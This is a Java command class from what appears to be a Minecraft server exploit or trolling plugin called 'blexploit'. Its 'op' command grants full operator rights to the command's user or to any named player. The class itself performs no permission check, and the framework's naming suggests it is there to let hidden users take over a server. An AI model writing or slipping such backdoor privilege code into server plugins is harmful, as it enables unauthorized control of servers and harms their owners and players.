package de.blexploit.command.cmds;

import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.Start;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Op extends Command {

	public Op() {
		super("op", "Setzt dich oder wen anders Operator", TabManager.INSERT_PLAYERNAME);
	}
	
	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 1) {
			mt.getPlayer().setOp(true);
			mt.getPlayer().sendMessage(Start.prefix + "§aDu hast nun OP Rechte!");
		}
		else if (args.length == 2) {
				Player vic = api.Get.player(args[1]);
				if (vic == null) {
					mt.fehler(Fehler.PLAYER_NOT_FOUND);
					return;
				}
				vic.setOp(true);
				this.SpielerInfo(mt, "hat §c" + vic.getName() + this.CHAT_COLOR + " geopt!");
		}
		else
		{
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}
	

}
